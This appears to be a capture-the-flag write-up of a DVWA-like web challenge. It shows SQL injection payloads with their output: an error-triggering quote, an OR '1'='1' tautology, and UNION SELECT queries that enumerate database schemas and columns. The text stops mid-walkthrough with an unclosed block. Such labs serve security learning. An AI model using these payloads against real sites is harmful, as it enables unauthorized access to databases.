This challenge looks like the "low" level of
[Damn Vulnerable Web Application](https://github.com/digininja/DVWA).

This website allows us to query the "CIA Ofiicial Records" (sic) by entering an id in the textbox.

```
>>> id: 1
First name:Harry
Surname: Potter
```

```
>>> id: 2
First name:Hermione
Surname: Granger
```

```
>>> id: 3
First name:Ronald
Surname: Weasley
```

```
>>> id: 4
First name:Joker
Surname: Joker
```

Now let's try some basic [SQL injections](https://owasp.org/www-community/attacks/SQL_Injection).

```
>>> id: 1'
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' Limit 1' at line 1
```

```
>>> id: 1' OR '1'='1'#
First name:Harry
Surname: Potter

First name:Hermione
Surname: Granger

First name:Ronald
Surname: Weasley

First name:Joker
Surname: Joker
```

Name of all the databases?

```
>>> id: ' UNION SELECT 1, schema_name FROM INFORMATION_SCHEMA.SCHEMATA#
First name:1
Surname: information_schema

First name:1

First name:1

```
>>> id: ' UNION SELECT 1, column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='Joker'#
